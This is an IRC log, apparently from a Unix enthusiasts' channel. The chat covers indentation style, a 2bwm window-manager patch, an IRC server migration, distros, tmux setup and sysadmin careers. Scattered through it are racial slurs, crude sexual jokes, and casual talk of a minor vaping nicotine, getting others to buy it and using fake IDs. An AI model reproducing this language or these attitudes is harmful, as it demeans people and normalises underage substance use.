12:36        z3bra │  if you use spaces instead of tabs, the others will not be able to choose their indent size, BUT, they will look at well aligned code
12:36      dcat|lp │  http://pub.iotek.org/p/UYmWfY0.png
12:37        z3bra │  dcat|lp, because you use tabs for indentation here, not for alignement

12:37      dcat|lp │  oh
12:38        z3bra │  The problem is that when someone use tabs to indent, they use it to align text too
12:38        z3bra │  and this is crap
12:38        z3bra │  tabulation should exist ONLY at the beginning of a line
12:39        z3bra │  hope you get me
12:39      dcat|lp │  yeah
12:39      dcat|lp │  I actually had to read what you meant
12:41      dcat|lp │  but shouldn't really comments be of the preceeding line?
12:41        z3bra │  preferences
12:42        z3bra │  and even if you put comments on a different line
12:42        z3bra │  will you too put macro definitions, variable names and such on a different line ?
12:42      dcat|lp │  what about smart tabs?
12:42          evo │  Oh ew, yeah I only use it to indent at the start of lines.
12:43        z3bra │  dcat|lp, smart tabs ?
12:43        z3bra │  like in :set smarttab ?
12:43          evo │  tabs that adjust size based on user preferences?
12:43          evo │  I know I can open a tabbed file and adjust my size and the whole file will adjust on the fly
12:43      dcat|lp │  I thought smarttab was that it added spaces for comments, and tabs for indention
12:43        z3bra │  nope
12:44        z3bra │  it uses shiftwidth to indent, and tabstop to align

12:56        z3bra │  it's not :)
12:57         yrmt │  Yes it is, try using it on a repo with million of files
12:58        z3bra │  then the repo is slow to fetch
12:58        z3bra │  because of your connection maybe, or anything else
12:58        z3bra │  I doubt svn, bzr or hg would be better at it
12:58        z3bra │  or even tar
12:59         yrmt │  not fetching
12:59         yrmt │  adding, committing

12:59         dcat │  completion?
12:59         yrmt │  I don't know if there's something faster, I'm just saying using git on a pkgsrc tree can be painful
12:59         quit │  evo
13:00        z3bra │  okay then
13:00         dcat │  anyway, git masterrace
13:01        z3bra │  that's gonna be a pain to change alt-tab behavior of 2bwm :/
13:01         yrmt │  what do you want to change it to?
13:01        z3bra │  making it cycle through different 'workspace'
13:02        z3bra │  If that workspace is visible, then, its windows should be cyclable
13:03        z3bra │  so that if you see two workspaces at the same time, alt-tab will cycle through all the windows
13:03        z3bra │  not only windows of the current workspace
13:03        z3bra │  also, that asprintf() is a pain ._.
13:03        z3bra │  why isn't it fixed ?
13:06         yrmt │  Gah, cups is being a bitch to compile
13:07         dcat │  doesn't osx ship with cups?
13:08         yrmt │  yes
13:08         yrmt │  but some ports need it
13:08         dcat │  and you can't use the one that's already there?
13:08         yrmt │  Well, that means I'll have to modify tons of ports that depend on it
13:09         yrmt │  but I'll try just for libreoffice

14:24       ripper │  Oh, I see! :|
14:25       ripper │  Shellcode is defined as a set of instructions injected and then executed by an
14:25       ripper │  exploited program. Shellcode is used to directly manipulate registers and the
14:25       ripper │  function of a program, so it is generally written in assembler and translated
14:25       ripper │  into hexadecimal opcodes.
14:25       ripper │  Basically just exploitation :3
14:26        dami0 │  sounds like a fancy way of saying shell scripting
14:26       ripper │  I don't really know!
14:26       ripper │  But what's shell scripting? :|
14:26       ripper │  I thought that meant bash commands or so?
14:26        dami0 │  yeah
14:26      dcat|lp │  yeah
14:27        dami0 │  but you can put them in a file, call it a script and feel good
14:27       ripper │  What does that have to do in any way with shellcoding? :|
14:27      dcat|lp │  dami0: shellcode is machine code
14:27        dami0 │  oh
14:27      dcat|lp │  usually to inject into memory
14:27        dami0 │  if people could only agree on standard nomenclature
14:28       ripper │  dcat, Yup :3
14:28      dcat|lp │  such hacker
14:28       ripper │  :|

16:57        z3bra │  venam, do you prefer a directory patch, or just the one for 2bwm.c ?
16:57        z3bra │  (it only needs 2 #define in config.h)

16:57        z3bra │  kk
16:59        venam │  z3bra: you did the patch on the devel branch or the master?
17:00        z3bra │  master I guess
17:00        z3bra │  the one used in AUR :p
17:00        z3bra │  master
17:01        z3bra │  Is there a big difference between master and devel ?

17:10       phyrne │  So nice being jailbroken again :)
17:10        venam │  z3bra: what's the main advantage of groups?
17:11        z3bra │  It's the same as workspaces, but you can show multiple workspaces at the same time
17:11       phyrne │  add tiling pl0x ;__;
17:12        venam │  z3bra: so you added keybind for the add to workspace?
17:12        z3bra │  nope
17:12        z3bra │  there is a #define GROUP_WINDOW
17:12        venam │  how do you show 3 workspaces at the same time?
17:12           eye│  eye`off
17:12        z3bra │  alt+f1, alt+f2, alt+f3
17:13        venam │  this would add the window to group 1 2 and 3?
17:13        z3bra │  Ah, nope
17:13        venam │  then it's freaking useless
17:13        venam │  @_@
17:13        z3bra │  you can use sendtoworkspace()
17:14        z3bra │  it will send window to group X
17:14        venam │  so there's a removefromworkspace also?
17:14        z3bra │  yes, but it was ever coded
17:15        venam │  so atm, it's the exact same thing as workspaces
17:15        z3bra │  except that when you "switch" to a different workspace, the previous is still displayed onscreen
17:16        z3bra │  which keybind do you use to switch to workspace 3 atm ?
17:16        venam │  MOD4+1234
17:16        z3bra │  okay
17:16        venam │  MOD4+3
17:16        z3bra │  mod4+3 will set group 3 as "current group"
17:16        venam │  but if the previous workspace is still displayed it's very annoying
17:17        z3bra │  so every window you spawn will be attached to it
17:17        venam │  ok
17:17           ok │  hi
17:17      dcat|lp │  sup bosko
17:17        z3bra │  if you do mod4+2, that will leave every window of group 3 on screen, but every new window spawned will be attached to group 2
17:17           ok │  sup dcat 
17:17           ok │  dcat|lp, *
17:18        z3bra │  if you do mod4+3 (while group 3 is displayed) that will hide all windows from group 3
17:18        z3bra │  and if you press mod4+3 again, that will show them again
17:18      dcat|lp │  why do you come back?
17:18        venam │  z3bra: ah, ok, that's cool, but it should automatically hide the non-related group when changing group
17:19        z3bra │  venam, I find it to intrusive imo
17:19        z3bra │  but it might be doable
17:19        z3bra │  Once you get X again, take a look at the video I made
17:19        venam │  like that it will be the same as before + you can show window from other groups on deman
17:19        venam │  *demand
17:19        venam │  z3bra: I'm in X

17:43         dcat │  wow such mature
17:44        z3bra │  venam, I can't find your key :/

17:45     NeoTerra │  let's see if that keeps him out for now
17:45        z3bra │  mmmh yeah
17:45         dcat │  I globally muted him
17:45         dcat │  that's why he wasn't talking
17:45        z3bra │  you can find mine @ pgp.mit.edu
17:46     NeoTerra │  EVERYONE LISTEN UP: I MADE A NEW IRC SERVER WITH BETTER SECURITY AND FIREWALL, THE IP IS 192.157.248.101. Jayro is updating the record at the moment. Please join that server and register your nick!
17:46     NeoTerra │  only registered nicks can talk on the new server, so get over there and register
17:47         dcat │  ... why not just add that config to this server?
17:47     NeoTerra │  because a new server is less messy
17:47        venam │  z3bra: I already found it on keys.gnupg.net
17:47     NeoTerra │  also irc.unixhub.net will soon redirect to the new server
17:48        z3bra │  oh, okay then :)
17:49         dcat │  cool NeoTerra 
17:49        z3bra │  i don't care, first joined
17:49         dcat │  what security does that server have that this doesn't?
17:49          yrmt│  yrmt|away
17:49        z3bra │  dcat, special char are mandatory in passwords ;)
17:50        Jayro │  The new DNS record should not take to long to propagate. However, dont be afraid to connect using the IP address 192.157.248.101 in the mean time. We can to get everyone over to the new server as soon as possible.
17:50        z3bra │  What will this one be used for then ?
17:50        Jayro │  We have been having issues with security lately. These issues have been resolved by the implementation of this new server. 
17:50         quit │  phyrne
17:50         dcat │  what security issues?
17:51         dcat │  also, where is the new server hosted?
17:52     NeoTerra │  dcat doesn't really matter
17:52      dcat|lp │  actually, it does.
17:52        Jayro │  Security through obscurity. 
17:52        Jayro │  lol
17:52      dcat|lp │  lel
17:52        Jayro │  It's in 'the cloud'
17:52        Jayro │  ;)
17:53  ElementalKK │  lol good going dcat
17:53     NeoTerra │  ping is almost negligible in IRC, it's not a huge deal
17:53        z3bra │  Mhh 
17:53        z3bra │  how can I make my laptop beep when I have less than 8% battery ?
17:53      dcat|lp │  I meant the "what security issues"?
17:54        venam │  z3bra: I have a python script for that
17:54        venam │  I make it run as a daemon, check the status every minutes
17:54        z3bra │  mmmh
17:54      dcat|lp │  if there's been security issues where I have a permanent account, I would like to know
17:54        Jayro │  Currently, many users can access things on this server they should not be able to. This has become a security risk. To keep our users and their nicks secure a new server was the simplest and quickest solution.
17:55        z3bra │  python... 
17:55        z3bra │  ^^
17:55        Jayro │  You will not notice a difference. Aside from the stronger password requirements.
17:55     NeoTerra │  pretty much what Jayro said. Also I added a firewall
17:55     yrmt|away│  yrmt
17:55        z3bra │  Jayro, stronger password requirement ?
17:55         yrmt │  phyrne's gone?

17:55         yrmt │  nooo

17:56        z3bra │  My password is 'password'
17:56        z3bra │  dat strong requirements...
17:56        venam │  z3bra: the focusnext has been rewritten entirely
17:56        z3bra │  venam, huh ?
17:56        z3bra │  Oh!
17:57        z3bra │  Well, It copy/pasted the function below
17:57        Jayro │  z3bra, requirements are stronger, but thats just stupidity :p
17:57        z3bra │  i don't care that someone connects as me on the irc
17:57  ElementalKK │  my password is yOuCunthacKmE69
17:58        Jayro │  z3bra, others do, hence the upgrade :)
17:58        z3bra │  okay :)
17:58        venam │  z3bra: there's only GROUP_WINDOWS and  WORKSPACE_DEFAULT new in the config.h

00:17        mafia │  :>
00:18     NeoTerra │  what is tmux anyways? I keep hearing that thrown about
00:18     NeoTerra │  is it some bar or something?
00:18        mafia │  I've actually never used it, screen has been fine with me.
00:19         quit │  BigE
00:19     NeoTerra │  is it the thing that splits your console screens?
00:19        mafia │  yep
00:20     NeoTerra │  bleh
00:20     NeoTerra │  ricers
00:20     NeoTerra │  lul
00:21        mafia │  So I installed a minimal net install of debian. I'm at peace with it, aha.
00:21     NeoTerra │  nice! I use a minimal netinstall of opensuse
00:21     NeoTerra │  perfect blend of speed and functionality IMO
00:21      jjumbii │  fucking bitch teacher
00:21      jjumbii │  tfw you get a 95 on the test and 78 on the test correction
00:21        mafia │  ah I haven't used opensuse in agesss.
00:22        mafia │  I never gave it more then a day though, do you like?
00:23     NeoTerra │  mafia a lot of people rip on it, but I love YaST
00:23     NeoTerra │  also I find it's generally stable
00:24     NeoTerra │  wish they had a LTS though
00:24     NeoTerra │  currently they are on an 18 months dev cycle
00:24     NeoTerra │  which isn't too bad
00:25      jjumbii │  shix: this movie is awesome so fast
00:25      jjumbii │  *so far
00:27        mafia │  nice nice, that's why I ended up installing this debian install. It's bare bones, fast as fuck, and a lot more functional then openBSD for obvious reasons. Plus I realised I only used Linux for a month and went straight to BSD and stayed there, I wanna give linux a go for awhile.
00:28     NeoTerra │  if you're really used to BSD then you might not like the hodgepodge of stuff that is linux, but it's compatible with just about anything and it's stable
00:31         shix │  jjumbii: lol 95 on test and 78 on test correction
00:34        mafia │  Yeah I'm pretty used to BSD but I honestly don't mind running linux. Especially something like a minimal install so  I can cut past the bloat.
00:35      jjumbii │  yup
00:35      jjumbii │  now i have a fucking B
00:35         shix │  lul just come do IB with me
00:36      jjumbii │  i would love to honestly
00:36      jjumbii │  but eh, parents
00:37         mxtm │  jjumbii, wot did she put on the correction grade?
00:37      jjumbii │  i missed like 2 problems
00:37      jjumbii │  apparently my corrections were not up to her expectations
00:37         mxtm │  also, I got in my 3 new juices, I can only use one of them in my current tank, but I got a menthol which I fucking love
00:37         mxtm │  I also got them w/ nicotine, and I possibly nicotine overdosed today, WOO!
00:38      jjumbii │  mxtm: you're fucked

00:38         mxtm │  jjumbii, why am I fucked, nigga
00:38      jjumbii │  have fun with your physical addiction
00:39         mxtm │  nicotine overdose isn't deadly unless you like, purposefully try to overdose

00:39         mxtm │  it's cheap as fuck, I got 270 mL of juice for $20
00:40      jjumbii │  well damn i should get some
00:40         mxtm │  lol
00:40     NeoTerra │  jjumbii yeah ecigarettes are cheap as fuck
00:40         mxtm │  and my tank holds 1.6 mL and I go through like a tank a day TOPS
00:40         mxtm │  NeoTerra, yap
00:40     NeoTerra │  although personally, I prefer real smokes
00:40         mxtm │  eh, they're too expensive and I don't like them for other reasons
00:41     NeoTerra │  mxtm you also have to be 18 to buy em lul
00:41         mxtm │  but I wanted to try nicotine so, 6mg / mL, the lowest dose, is what I have
00:41         mxtm │  NeoTerra, I have friends who can help me out w/ that :p
00:41     NeoTerra │  I had a fake ID when I was in high school
00:41     NeoTerra │  worked in the states all the time because they never have a clue what Canadian ID's look like
00:42         mxtm │  nice, I don't have cash for that right now though, and my extra cash will be into new tanks and stuff and more juice

00:42         mxtm │  maybe I'll return those 2 juices I can't use right now... actually I was going to buy a glass tank soon though
00:42         mxtm │  nope
00:42         mxtm │  I'm sure they'd be more accepting of it if I started to magically get my homework done, then I could say "look it's helping me" >_>?

02:07       libbro │  jjumbii: UNITE!
02:07       libbro │  crushd is 100% correct
02:07       libbro │  Well, more like 98%
02:07        crshd │  i said "more or less"
02:07      jjumbii │  yeah it's pretty much all preference
02:08       fenriz │  rpm = yuck.
02:08       libbro │  jjumbii: I dislike it when people get so flamed about which distro people use.
02:08        crshd │  anything that one distro has that another doesn't, you can tear out and use it on yours
02:08         shix │  i agree with fenriz lul
02:08      jjumbii │  yeah but if you use arch, go fuck yourself
02:08         shix │  pacman nigger race
02:08       libbro │  shix: l3l
02:08      jjumbii │  yeah, i've used CentOS a lot, after awhile i realized how shit it was
02:09        crshd │ compiled pacman on crux once
02:09       fenriz │  i had to use a centos box at work
02:09         shix │  slackpkg/sbopkg master race
02:09       fenriz │  and i'm like...wow:
02:09       libbro │  What's wrong with CentOS, never used it BTW
02:09       fenriz │  apparently searching for vim wasn't enough
02:09       fenriz │  it's called "vim.enhanced.noarch'
02:09        tbuck │  shix: aw yeah
02:09       fenriz │  they cna go fuck themselves.
02:09         mode │  +h crshd
02:09        crshd │  i'm special!
02:09      jjumbii │  fenriz: yeah it's real crazy shit
02:09       fenriz │  and once you get it, you want plugins (cuz powerline lul)
02:10       fenriz │  and then you find out it doesn't work.
02:10         shix │  \do you even emacs
02:10        crshd │  emacs master race!
02:10       fenriz │  after much reading on the forus, crawling on message boards you do:  vim --version
02:10        crshd │  now *that's* a distro everybody should run!
02:10       fenriz │  OH LOOK ITS 7.0
02:10        tbuck │  master race master rice!

02:11       fenriz │  jjumbii: that's impressive you got centos to look like that.
02:11       libbro │  shix: lol. Emacs is an OS
02:11         shix │  RMS tried to write an editor in lisp and ended up with an entire OS.
02:11     NeoTerra │  crshd I still can't get over how clean your parking garage is

02:11     NeoTerra │  fenriz you can't, you're not an OP/half-OP
02:11       fenriz │  :/ dang
02:11        crshd │  NeoTerra, that must have really shocked you...

02:12        crshd │  you don't have parking garages like that in CA?
02:12       fenriz │  hahaha
02:12     NeoTerra │  crshd no...they all look like shit
02:12        crshd │  you should see some parking garages in the malls here, then
02:12        crshd │  they even paint the floors in pretty colors and shit

02:13       fenriz │  aww what.
02:13       fenriz │  so all shix had to do was call NeoTerra a nigger and he got it?
02:13       fenriz │  lemme try:
02:14       fenriz │  NeoTerra: SOME NIGGER SHOULD GIVE ME HALF OP
02:14         shix │  sorry fenriz, all the spots are taken
02:14        crshd │  i see a kick coming up on the horizon...
02:14       fenriz │  dang.
02:14     NeoTerra │  fenriz he had half-OP before and I forgot to give it to him on the new server
02:14     NeoTerra │  lul

02:18      jjumbii │  scrape websites for papers
02:18        crshd │  and i made it :D

02:19        crshd │  https://github.com/crshd/fetch.el
02:19        crshd │  and i got it into MELPA :D
02:20     NeoTerra │  crshd what's MELPA?
02:20         shix │  dang thats pretty cool 
02:20        crshd │  if you're looking for something easy to do, integrate it with the UH pastebin, so it can paste the current region/file
02:21        crshd │  NeoTerra, one of the big emacs package archives
02:21         shix │  Too bad there are only like 4 people who use emacs here :(
02:21        crshd │  i did something like that for xinu, but i'm not quite happy with it, since it relies on curl

02:23        crshd │  also see L61 in the same file. you can improve that while you're at it
02:23        crshd │  get rid of curl and use emacs' built-in http stuff

02:30       libbro │  Is there a vim plugin that displays #{colorcodething} text as the actual color that it is supposed to be?
02:30        crshd │  yup
02:30       libbro │  :D
02:30        crshd │  don't know what it's called right now
02:30        crshd │  but i remember there is
02:31       libbro │  crshd: Okay, thANks m8
02:31        crshd │  obviously only gvim, though
02:32        crshd │  might approximate the colors for console, i don't remember
02:32       libbro │  Wouldn't it be possible on normal vim with a bit of rice?
02:32        crshd │  never really used console vim
02:32       libbro │  Oh
02:32        crshd │  nope, it wouldn't be fully possible, since you're limited to your term's 16/256 colors
02:33       libbro │  Oh, well aproximations would be alright too
02:33        crshd │  that's why you could only approximate the colors, but you wouldn't be able to display the exact value
02:33       libbro │  http://www.vim.org/scripts/script.php?script_id=2150
02:33       libbro │  Found it
02:35       fenriz │  so have we gotten rid of rude yet?

16:32        z3bra │  venam, in fact, I find uml editors pretty good to create diagram and use case for documentation

16:44         yrmt │  I don't know much about virtualization though
16:45       phyrne │  Fair enough :) As much as I'd enjoy that talk, I'm sure there's other stuff going on I'd rather be at
16:45       phyrne │  Looking forward to this being a very BSD oriented weekend :D

16:51       phyrne │  yrmt: Good idea! :) Could probably even put it in the Reminders.app if you use a timestamp in the titles and order them correctly. In fact that would work quite nice :)
16:51        venam │  so I let them do aweful things
16:51       phyrne │  venam: Hah, it's the only way to learn!

18:08        dami0 │  nah I'm kidding. seriously though, what's your flavour?
18:08      lidstah │  although I used it on my old thinkpad - sadly, no wifi drivers :/
18:09      lidstah │  right now, I use mainly arch on my desktop and day to day laptop, debian on my servers, and openBSD on the thinkpad
18:09      lidstah │  (and at work, but it is another story ;))
18:09        dami0 │  oh, I use arch on my raspi and desktop
18:09        dami0 │  >200mb of updates today

18:19        kirby │  Mine's stuck between a lovely IKEA desk and shelf-thing, so you only see it looking front-on without turning it.

18:24        dami0 │  also, can't be bothered with rebooting my raspi
18:24       Jeevus │  ahhh libreoffice yeah, that'll do it
18:24        dami0 │  going to see what uptime I can reach
18:24        kirby │  Mine only gets rebooted when we reboot the router, which it's plugged into.
18:24      lidstah │  dami0: :)
18:24        kirby │  So it gets rebooted quite a lot.
18:24       Jeevus │  i don't have that so might not be as much, but i'll have the nvidia drivers and virtualbox for sure

18:29      lidstah │  and one nice thing
18:30      lidstah │  is that they put a serial port on this little mobo
18:30      lidstah │  and my main desktop also have a serial port :)
18:30      lidstah │  so even if I fuck up everything, I'll still have access through the console port
18:31       Jeevus │  ah yeah that's awesome
18:32      lidstah │  that was the "killer feature" for this little box, and this is why I took it instead of an old dell P4 computer

22:26         rude │  Jayro, not a comment really on the "code quality" i cant say much for go
22:26         rude │  but you should wait for a "001" message

22:28         rude │  something simple like irc proto
22:28         rude │  shouldnt require regex really
22:28         yrmt │  Jayro: use this: https://github.com/fluffle/goirc
22:29         yrmt │  brb, another beer
22:29     ne0phyte │  hm if he's asking for code quality he probably is rather new to coding (?). parsing manually is harder than using a regex.
22:29        Jayro │  yrmt, i could use that
22:29        Jayro │  but then how would I learn
22:30     ne0phyte │  by not reinventing the wheel but writing something new lol
22:30        Jayro │  rude, it would have been just as easy to do without regex
22:30        Jayro │  but why the fuck not
22:31     ne0phyte │  that wasn't a serious response
22:31     ne0phyte │  I hate it when people ask me why I do something
22:31     ne0phyte │  because I can. lots of programmers to useless stuff because they can. no need for a reason imo

22:41      gurhush │  but yeah
22:41         yrmt │  It has much more ports than OpenBSD

22:41         yrmt │  and it's pkg_* is shit
22:41         yrmt │  OpenBSD should use something like pkgng or pkgsrc
22:43       Jeevus │  yrmt, what's in the bootstrap?
22:43      gurhush │  So, I think I'll install ZFS and make a ZFS snapshot before trying this yrmt 
22:44         yrmt │  Jeevus: everything needed to install packages
22:44         yrmt │  that with clang and you can build ports
22:44         yrmt │  gurhush: zfs's in my repo
22:44         yrmt │  ──── pkgin se zfs
22:44         yrmt │  zfs-0.6.2            ZFS is a combined file system and logical volume manager designed by Sun Microsystems. 
22:44         yrmt │  :)
22:45       Jeevus │  ohhhh alright, so if i've got pkgin and stuff already, i don't need to do anything there?
22:45         yrmt │  How did you get it though
22:45       Jeevus │  through saveosx, a while back
22:45         yrmt │  Oh yeah we didn't update it
22:45         yrmt │  :)
22:46      gurhush │  yrmt: but don't I need to repartition everything to ZFS?
22:46       Jeevus │  hahaha so the version i've got is still solid?
22:46         yrmt │  gurhush: you can't use root on zfs on osx
22:46         yrmt │  it's just for external drives

07:19        mafia │  so god damn glad I started using tmux
07:19        tbuck │  its nice
07:21         shix │  i never got into it
07:22        tbuck │  its crucial for irc
07:22         shix │  why?
07:22        tbuck │  if i have to restart X i can stay logged in, or if i accidentally close the window
07:22        tbuck │  if im on my desktop i can ssh in and attach the same session
07:23        tbuck │  just nice to have
07:23         shix │  ah, i never needed to restart X, never accidentally closed the window, or had to ssh into my machine lul
07:29         shix │  http://www.youtube.com/watch?feature=player_embedded&v=dJoo7Tgjr8U#! lul
07:31        mafia │  I never got into it either until I gave it an actual try, now I won't go back. It's worth it.

09:23  thang1thang │  haven't been on here in forever, I hate being this busy...
09:24        mafia │  what's up, I don't think I've ever seen you before.
09:25  thang1thang │  oh hey there, yeah I don't recognize you rname lol. But anyway how are you doing? I'm just brushing up on the chemistry before a test...
09:25  thang1thang │  (that's tomorrow, in like 8 hours)
09:26  thang1thang │  how about you?
09:29        mafia │  Sounds shitty, I'm good probably should sleep. but I'm good xD
09:31  thang1thang │  lol, it is kinda shitty but it's what I get for being an engineer right?
09:31  thang1thang │  and where are you at? East coast or something?
09:31        mafia │  Nope West coast..lmao.
09:32        mafia │  Been running on 2hrs of sleep
09:33  thang1thang │  eh, west coast here as well. I just thought you'd be east coast if you were complaining about being tired at 12:30am :p
09:33  thang1thang │  and ahh, gotcha, why so little sleep? 
09:34        mafia │  Yeah I didn't think to add that part first lmao. And well honestly no reason, just couldn't sleep last night and kinda stayed up. Then I hopped on my favourite game and that pretty much sealed the deal 
09:35  thang1thang │  ahh, iknowthatfeel. That's why I had to quit gaming when I went to college
09:35  thang1thang │  I barely passed my first quarter as it is, I would've flunked straight out for sure had I even had any games installed on my computer
09:36        mafia │  Yeah Ill be doing the same when I go, I already don't have any time as it is with work. I know for a fact ill have to stop once I go to college
09:36  thang1thang │  lol yeah, it's not that gaming's bad, it's just one of the greatest timesinks known to man...
09:37  thang1thang │  you a senior at high school or just going to college after taking time off to work?

09:42  thang1thang │  that's where I would put my hunny
09:42  thang1thang │  IF I HAD ONE ;-; 
09:44       phyrne │  u wot m8
09:46        mafia │  Saving up cash to go to college, I'm 23 haha
09:47        mafia │  mornin phyrne
09:48  thang1thang │  topic for #unixhub -> I need a hunny
09:48       phyrne │  morning mafia! No shame in that at all :)
09:48       phyrne │  thang1thang2: Haha, it was actually about yrmt putting honey on his boner
09:48  thang1thang │  lol, makes sense. I lucked out in that regard, I guess. I don't need to save any money for college, so I'm going straight out of high school. what major will you be pursuing?/ 
09:49  thang1thang │  And uhhmm... I won't even ask ._.
09:49       phyrne │  thang1thang2: :p
09:49       phyrne │  Yeah mafia, what is it you're wanting to do at college? :)
09:49  thang1thang │  all the sudden "bear den" has an entirely new meaning ...
09:49       phyrne │  phaha
09:50        mafia │  I wanna be a sysadmin :p
09:50  thang1thang │  "I like my lube how I like my sex. Rough and viscuous and manufactured by the sweat and tears of illegal mexicans"
09:50       phyrne │  mafia: Come work for us! :)
09:50        mafia │  At least I think I do, I'm still thinking.
09:50        mafia │  xD
09:51        mafia │  ikr
09:51       phyrne │  I'm a sysadmin and I've never undertaken any education with relation to computing :p
09:51  thang1thang │  anyway, I'm in for computer engineering with a minor in computer science (programming)
09:51       phyrne │  And srsly, our junior SA.... he.... he just can't brain. I'll fire him and we'll hire you :p
09:51  thang1thang │  sysadmin is one of the degrees where, idk, I feel like it's not really needed to have a degree in it. Practical experience is 100 more useful in the sysadmin world from what I've seen
09:52       phyrne │  ^ this
09:52  thang1thang │  At least with programming if you get a CS degree you'll have formal training in using headers, libraries and writing code in a systematic way, but sysadmin is all about fixing and preventing errors and you just can't really learn that in the classroom lol
09:52        mafia │  Yeah I just wasn't sure on the whole application details if I don't go to college, and don't have something decent to put down, how good are my chances yeno?
09:53       phyrne │  thang1thang2: And infrastructure development! It's not all support ;)
09:53  thang1thang │  Depends on having a good resume and being hired into a place that isn't 100% beaucracrap
09:53       phyrne │  Suppose it depends what sort of shop you end up in
09:53  thang1thang │  lol  true enough, phyrne, support's just the first thought of mine when it comes to sysadmin fields :p
09:54  thang1thang │  I'd say that you would want to put into your resume examples of real world experience related to the type of sysadmin job you're shooting for
09:54       phyrne │  Yiss :) And the different systems you have experience
09:55       phyrne │  Also, link your GH on your resume/CV if you have one
09:55        mafia │  I see I see, I think I'm gonna take a couple free online courses, maybe like a month long course or two. Then attempt some apps :p
09:55  thang1thang │  So if you're trying to get hired into a smaller company and basically be the IT for their server, you might want to put onto the resume "oh hey I built and maintain a 35TB server in my house, and built a server for a small private school"
09:55       phyrne │  A lot of it is demonstrating how passionate you are about it too
09:55  thang1thang │  ^
09:55        mafia │  Well I've got the passion lol, not worried about that :p
09:56  thang1thang │  Another thing that might be really useful is demonstrating a wilingness to learn :p A lot of trouble I see with graduates or people with degrees is they suffer from an insulated "know-it-all" attitude
09:56       phyrne │  mafia: You should play with some "sysadmin'y" tools in a lab :) Set up Puppet/Chef, Nagios/Zabbx/Sensu
09:56  thang1thang │  they're probably some graduate retard with a 4.0 who thinks that since they aced all their classes that it means they know everything
09:56       phyrne │  haha
09:56        mafia │  I should :)
09:57  thang1thang │  I mean, seriously, I talk to some of the junior CS majors about vim or some of the other deeper tools of linux and they're all "well nah this is faster for me, thanks" (mfw they're using sublime text 2 and never touch the terminal for anything)
09:57        mafia │  lmao
09:58        mafia │  I always assumed they taught you decent cli in college
09:58        mafia │  I guess I was mistaken xD
09:58  thang1thang │  Oh they "know" how to use the cli
09:58  thang1thang │  they just never do, except for a few of them
09:59        mafia │  ah I see 
09:59  thang1thang │  I've met... one dude who uses the CLI regularly. Everyone in the lab when they're working on stuff refers to him as some sort of wizard jedi when it comes to computer knowledge 
09:59  thang1thang │  I'm probably already hitting close to his level of CLI knowledge just from installing arch on my mac as a main install
10:00  thang1thang │  I don't even touch a normal file browser, I hate nautlius and I've more or less entirely disabled the trackpad. Haven't even had arch for a month... It just kinda does that to you
10:00        mafia │  xD Yeah all my *nix knwoledge is self taught
10:00        mafia │  knowledge
10:00        mafia │  pretty much
10:01        mafia │  The only GTK app I use is firefox. 
10:01        mafia │  And that's only for hardcore web surfing
10:01  thang1thang │  what do you use for normal? I use firefox for all my web surfing just 'cause I love pentadactyl so much
10:02  thang1thang │  dem vim keybindz 'ah sexy
10:02  thang1thang │  but there are things about arch linux that piss me off
10:02        mafia │  Well you could say it's normally used. But I'd say 35% of the time I use w3m
10:03  thang1thang │  like, my wifi still doesn't work right in my dorm room 'cause I'm using WPA2 for the access router. And I haven't even begun to get the printer set up so I can print wirelessly from it, and there's small things like how the sound doesn't pause if I unplug headphones.
10:03  thang1thang │  Kinda still used to OS X "just working" with stuff like that.
10:04  thang1thang │  and w3m, nice. I have w3m but I haven't used it much, can't get near the browsing speed and comfort with it that I do with firefox, though
10:04  thang1thang │  (it does suck that firefox can't really theme the background nicely, so it's a nice blinding frickign white everywhere when everything else is my sexy term. colorscheme )
10:04        mafia │  Yeah that's just normal, and it will usually stay that way till your in the mood to fuck with something. Shit I've never had a perfect setup, I usually have at least one or two small things wrong that I just don't give two fucks about so I let them be.
10:05  thang1thang │  lol
10:05        mafia │  You could actually fix that, just add custom userstyles or userchrome.css entries for specific websites.
10:05  thang1thang │  well I give a fuck about the wifi, I just don't have time to mess with it right now
10:05  thang1thang │  that shit disconnects every 30s to 2 mins in the room -_-
10:05        mafia │  I have styles for 4chan, reddit, google, and youtube. 
10:06        mafia │  oh damn :o
10:06  thang1thang │  yeh. I'll probably do that, I just wish there was some sort of nice "dark mode" for it...
10:06  thang1thang │  I'll get lucky and have wifi running smoothly for 5-10m sometimes even 30 minutes at a go sometimes, but it's about 10x slower than it should be and a general pain in the damn ass
10:07  thang1thang │  open networks are fine though, and WEP networks are fine, it's the fact that the access poitn is WPA2, I'm sure of it
10:09  thang1thang │  I also don't have the bar set up on my linux and it's bugging the shit out of me. I've tried probably 3-5 setups and none of them really work. I'll figure it out whenever I'm willing to devote a sunday to just my dumb status bar
10:11        mafia │  lol beleive me you wanna devote time to a bar, they are a pain in the ass and they constantly fuck with you. It's almost as bad as picking a colorscheme or a wallpaper
10:11  thang1thang │  yeah. I got the colorscheme almost perfect though. I borrowed someone else's and I just happened to really like it
10:12  thang1thang │  I just want to modify the orange a wee bit and make everything more monochromatic. And then make the white less bright for a more low contrast setup (and then increase font size 'cause I'm like blind or something)
10:12        mafia │  Yeah theres a lot of good ones out there, you'll get tired of it eventually though. :p
10:12        mafia │  what font are you using?
10:13  thang1thang │  oooh, the other thing I need to do is get the fucking tmux scroll up/down thing working proper and the damn copying, selecting text and url selection/etc in tmux set up
10:13  thang1thang │  I'm pretty sure it's terminus. I've never been too anal about my fonts so I haven't actually done much to the font
10:13        mafia │  Yeah I actually just started using tmux yesterday, I have to fuck with my copying too
10:14  thang1thang │  tmux is awesome. I don't use it "correctly" though. I just bound it to my terminal to open it so everything opens automatically in a new tmux session, when I spawn a new terminal
10:14        mafia │  I can copy and paste fine, but only within that window. I can't copy from say tmux to firefox
10:14  thang1thang │  weird..
10:14  thang1thang │  I can do that fine ._.
10:15        mafia │  Yeah I know it's user error though, I'm sure I messed up the config. I did a lot of work to it :p
10:15  thang1thang │  I have bind-key p run "xclip -o | tmux load-buffer -' tmux paste-buffer"
10:15  thang1thang │  for my pasting (into) tmux
10:18  thang1thang │  What I do like though is the status bar I have set up in tmux. I have vol: xx | <3 xx% | Date hr:mn AM in the right
10:18  thang1thang │  almost gets rid of my need for a bar in general except I want one, and firefox of course...
10:20        mafia │  Yeah I have my name in japanese, my battery %, and the day on my right. Kept it minimal, so I could leave up my bar :p I like it
10:20         quit │  fenriz
10:22  thang1thang │  wot laptop you use?
10:23        mafia │  Until I get my Toshiba Sat. back an old dell D600
10:23  thang1thang │  hey, paste some random url into the IRC, I wanna test out the url caching
10:23        mafia │  I fuckin love it
10:23  thang1thang │  lol
